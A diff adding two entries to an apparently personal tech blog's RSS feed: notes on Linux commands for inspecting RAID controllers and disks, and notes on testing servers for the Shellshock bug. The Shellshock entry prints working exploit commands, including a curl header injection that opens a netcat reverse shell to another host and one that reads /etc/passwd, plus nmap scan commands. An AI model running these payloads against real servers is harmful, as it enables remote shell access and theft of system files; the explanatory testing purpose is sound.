@@ -48,4 +48,108 @@
 &lt;p>rule 6: disable colours when writing to a pipe&lt;/p>
 &lt;/li>
 &lt;li>
-&lt;p>rule 7: - means stdin/stdout&lt;/p></description></item></channel></rss>
+&lt;p>rule 7: - means stdin/stdout&lt;/p></description></item><item><title>How to Detect RAID Information in Linux</title><link>https://linzeyan.github.io/posts/20221128-raid-information-command-line/</link><pubDate>Mon, 28 Nov 2022 15:36:27 +0800</pubDate><guid>https://linzeyan.github.io/posts/20221128-raid-information-command-line/</guid><description>&lt;ul>
+&lt;li>&lt;a href="https://www.baeldung.com/linux/raid-information-command-line" target="_blank" rel="noopener">How to Detect RAID Information in Linux&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h5 id="lspci">lspci&lt;/h5>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>lspci | grep RAID
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>00:1f.2 RAID bus controller: Intel Corporation &lt;span style="color:#ae81ff">82801&lt;/span> Mobile SATA Controller &lt;span style="color:#f92672">[&lt;/span>RAID mode&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">(&lt;/span>rev 04&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h5 id="lshw">lshw&lt;/h5>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>lshw -class storage
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> *-raid
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> description: RAID bus controller
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> product: &lt;span style="color:#ae81ff">82801&lt;/span> Mobile SATA Controller &lt;span style="color:#f92672">[&lt;/span>RAID mode&lt;span style="color:#f92672">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> vendor: Intel Corporation
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> physical id: 1f.2
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> bus info: pci@0000:00:1f.2
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> logical name: scsi0
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> version: &lt;span style="color:#ae81ff">04&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> width: &lt;span style="color:#ae81ff">32&lt;/span> bits
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> clock: 66MHz
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> capabilities: raid msi pm bus_master cap_list emulated
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> configuration: driver&lt;span style="color:#f92672">=&lt;/span>ahci latency&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> resources: irq:26 ioport:f0d0&lt;span style="color:#f92672">(&lt;/span>size&lt;span style="color:#f92672">=&lt;/span>8&lt;span style="color:#f92672">)&lt;/span> ioport:f0c0&lt;span style="color:#f92672">(&lt;/span>size&lt;span style="color:#f92672">=&lt;/span>4&lt;span style="color:#f92672">)&lt;/span> ioport:f0b0&lt;span style="color:#f92672">(&lt;/span>size&lt;span style="color:#f92672">=&lt;/span>8&lt;span style="color:#f92672">)&lt;/span> ioport:f0a0&lt;span style="color:#f92672">(&lt;/span>size&lt;span style="color:#f92672">=&lt;/span>4&lt;span style="color:#f92672">)&lt;/span> ioport:f060&lt;span style="color:#f92672">(&lt;/span>size&lt;span style="color:#f92672">=&lt;/span>32&lt;span style="color:#f92672">)&lt;/span> memory:f7e36000-f7e367ff
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h5 id="smartctl">smartctl&lt;/h5>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dmesg | grep -i scsi
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span> 0.210852&lt;span style="color:#f92672">]&lt;/span> SCSI subsystem initialized
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span> 0.341280&lt;span style="color:#f92672">]&lt;/span> Block layer SCSI generic &lt;span style="color:#f92672">(&lt;/span>bsg&lt;span style="color:#f92672">)&lt;/span> driver version 0.4 loaded &lt;span style="color:#f92672">(&lt;/span>major 243&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span> 1.213299&lt;span style="color:#f92672">]&lt;/span> scsi 0:0:0:0: Direct-Access ATA ST320LT012-9WS14 YAM1 PQ: &lt;span style="color:#ae81ff">0&lt;/span> ANSI: &lt;span style="color:#ae81ff">5&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span> 1.319886&lt;span style="color:#f92672">]&lt;/span> sd 0:0:0:0: &lt;span style="color:#f92672">[&lt;/span>sda&lt;span style="color:#f92672">]&lt;/span> Attached SCSI disk
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span> 19.571008&lt;span style="color:#f92672">]&lt;/span> sd 0:0:0:0: Attached scsi generic sg0 type &lt;span style="color:#ae81ff">0&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>smartctl --all /dev/sda
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Model Family: Seagate Laptop HDD
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Device Model: ST320LT012-9WS14C
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Serial Number: S0V3R9LL
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LU WWN Device Id: &lt;span style="color:#ae81ff">5&lt;/span> 000c50 05be4653c
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Firmware Version: 0001YAM1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Capacity: 320,072,933,376 bytes &lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">320&lt;/span> GB&lt;span style="color:#f92672">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Sector Sizes: &lt;span style="color:#ae81ff">512&lt;/span> bytes logical, &lt;span style="color:#ae81ff">4096&lt;/span> bytes physical
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Rotation Rate: &lt;span style="color:#ae81ff">5400&lt;/span> rpm
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Form Factor: 2.5 inches
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Device is: In smartctl database 7.3/5319
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ATA Version is: ATA8-ACS T13/1699-D revision &lt;span style="color:#ae81ff">4&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SATA Version is: SATA 2.6, 3.0 Gb/s &lt;span style="color:#f92672">(&lt;/span>current: 3.0 Gb/s&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Local Time is: Sat Nov &lt;span style="color:#ae81ff">19&lt;/span> 20:52:01 &lt;span style="color:#ae81ff">2022&lt;/span> PKT
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SMART support is: Available - device has SMART capability.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SMART support is: Enabled
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h5 id="megacli">MegaCLI&lt;/h5>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>megacli -LDInfo -Lall -aALL
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Adapter &lt;span style="color:#ae81ff">0&lt;/span> -- Virtual Drive Information:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Virtual Drive: &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">(&lt;/span>Target Id: 0&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Name : SEAGATE
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>RAID Level : Primary-1, Secondary-0, RAID Level Qualifier-0
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Size : &lt;span style="color:#ae81ff">320&lt;/span> GB
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Sector Size : &lt;span style="color:#ae81ff">512&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Mirror Data : &lt;span style="color:#ae81ff">320&lt;/span> GB
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>State : Optimal
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h5 id="lsscsi">lsscsi&lt;/h5>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>lsscsi
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>0:0:0:0&lt;span style="color:#f92672">]&lt;/span> disk ATA ST320LT012-9WS14 YAM1 /dev/sda
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h5 id="vendor-specific-tools">Vendor-Specific Tools&lt;/h5>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>omreport storage vdisk
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>List of Virtual Disks in the System
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Controller SEAGATE Laptop HDD
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ID : &lt;span style="color:#ae81ff">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Status : Ok
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Name : SEAGATE
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>State : Ready
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Hot Spare Policy violated : Not Assigned
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Encrypted : No
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Layout : RAID-0
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Size : 320.00 GB &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">343597383680&lt;/span> bytes&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>T10 Protection Information Status : No
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Associated Fluid Cache State : Not Applicable
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Device Name : /dev/sda
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Bus Protocol : ATA
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Media : HDD
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Read Policy : Adaptive Read Ahead
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Write Policy : Write Back
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cache Policy : Not Applicable
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Stripe Element Size : &lt;span style="color:#ae81ff">128&lt;/span> KB
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Disk Cache Policy : Enabled
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Test Whether a Server Is Vulnerable to Shellshock Bug</title><link>https://linzeyan.github.io/posts/20221128-linux-shellshock-bug/</link><pubDate>Mon, 28 Nov 2022 15:35:30 +0800</pubDate><guid>https://linzeyan.github.io/posts/20221128-linux-shellshock-bug/</guid><description>&lt;ul>
+&lt;li>&lt;a href="https://www.baeldung.com/linux/shellshock-bug" target="_blank" rel="noopener">Test Whether a Server Is Vulnerable to Shellshock Bug&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h5 id="the-shellshock-bug">The Shellshock Bug&lt;/h5>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>env x&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39; () {:;};&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h5 id="exploiting-shellshock-bug">Exploiting Shellshock Bug&lt;/h5>
+&lt;ul>
+&lt;li>A substituted command is executed since the feature ignores the command specified by the user, and instead, it runs that which the ForceCommand defines.&lt;/li>
+&lt;li>The ignored commands from the user are put in the &amp;ldquo;SSH_ORIGINAL_COMMAND&amp;rdquo; environment variable. If the user&amp;rsquo;s default shell is Bash, the Bash shell will parse the value of the &amp;ldquo;SSH_ORIGINAL_COMMAND&amp;rdquo; environment variable on start-up and run the embedded commands.&lt;/li>
+&lt;/ul>
+&lt;h5 id="examples-of-shellshock-exploit-commands">Examples of Shellshock Exploit Commands&lt;/h5>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">## 1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>curl -H &lt;span style="color:#e6db74">&amp;#34;X-Frame-Options: () {:;};echo;/bin/nc -e /bin/bash 192.168.y.y 443&amp;#34;&lt;/span> 192.168.x.y/CGI-bin/hello.cgi
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">## 2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>curl --insecure 192.168.x.x -H &lt;span style="color:#e6db74">&amp;#34;User-Agent: () { :; }; /bin/cat /etc/passwd&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
+&lt;li>use nmap script to test for the vulnerability&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>nmap -sV -p- --script http-shellshock 192.168.x.x
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nmap -sV -p- --script http-shellshock --script-args uri&lt;span style="color:#f92672">=&lt;/span>/cgi-bin/bin,cmd&lt;span style="color:#f92672">=&lt;/span>ls 192.168.x.x
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item></channel></rss>
